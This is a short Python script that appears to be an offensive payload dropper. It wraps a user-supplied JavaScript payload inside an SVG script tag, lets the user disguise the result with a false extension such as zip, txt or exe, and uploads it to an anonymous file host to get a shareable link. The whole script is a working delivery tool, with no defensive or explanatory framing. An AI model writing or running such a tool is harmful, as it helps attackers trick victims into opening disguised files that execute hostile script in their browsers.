import time
import os
try:
    import requests
except ImportError:
    os.system("pip install requests")
    import requests


SVG = r"""<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
    <script>
        %code%
    </script>
</svg>
"""

def main():
    js_code = input("Where is your file path to the JavaScript payload file? -> ")
    name = input("What do you want to name the file? -> ")
    filetype = input("What file type do you want to save it as? (Example = zip, txt, exe, etc.) -> ")
    try:
        with open(js_code, "r") as f:
            js_code = f.read()
            js_code = '\t\t'.join(js_code.splitlines())
        
    except FileNotFoundError:
        print("File not found")
        time.sleep(3)
        exit()
    svg = SVG.replace("%code%", js_code)
    svg_bytes = svg.encode("utf-8")
    try:
        r = requests.post("https://api.anonfiles.com/upload", files={"file": (f"{name}.{filetype}", svg_bytes)})
    except Exception as e:
        print(f"[-] {e}")
        time.sleep(3)
        exit()
    url = r.json()["data"]["file"]["url"]["full"]
    print(url)

if __name__ == '__main__':
    main()
    input("Press enter to exit")